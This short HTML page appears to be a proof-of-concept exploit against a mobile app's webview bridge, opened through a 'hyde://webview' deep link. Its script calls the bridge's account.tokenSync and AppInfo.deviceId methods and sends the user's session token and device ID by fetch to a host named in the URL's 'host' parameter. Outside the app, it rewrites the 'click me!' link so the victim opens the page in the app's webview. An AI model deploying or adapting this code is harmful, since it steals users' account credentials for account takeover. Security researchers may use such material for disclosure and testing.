<html>
  <head>
    <style>
      * {
        font-size: 48px
      }
    </style>
  </head>
  <body>
    <h1><a id="link" href="hyde://webview/h5page?jumpUrl=">click me!</a></h1>
    <code id="token"></code>
    <code id="deviceId"></code>
    <script>
      window.addEventListener('load', () => {
        var params = new URLSearchParams(location.search)

        if (typeof _dsbridge !== 'undefined') {
          document.getElementById('link').style.display = 'none'
          
          var token = _dsbridge.call('account.tokenSync', '{}')
          document.getElementById('token').innerText = token

          var deviceId = _dsbridge.call('AppInfo.deviceId', '{}')
          document.getElementById('deviceId').innerText = deviceId

          if (params.has('host') && params.get('host') !== '') {
            fetch(`https://${params.get('host')}/?t=${JSON.parse(token).data}&i=${JSON.parse(deviceId).data}`)
          }
        } else {
          document.getElementById('link').href = `hyde://webview/h5page?jumpUrl==${location.href.replace(location.search, '')}%3fhost=${params.get('host')}`
        }
      })
    </script>
  </body>
</html>
